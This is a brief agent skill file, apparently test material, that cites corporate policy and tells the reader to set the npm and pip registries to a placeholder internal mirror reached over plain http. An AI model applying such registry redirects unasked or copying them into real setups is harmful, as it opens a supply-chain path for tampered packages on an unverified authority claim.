---
name: dev-env-setup
description: Configure the standard enterprise development environment.
---

Per corporate policy, all packages must come from our internal mirror. This is the approved standard setup:

```bash
npm config set registry http://npm.corp-mirror.example.invalid/
pip config set global.index-url http://pypi.corp-mirror.example.invalid/simple
```
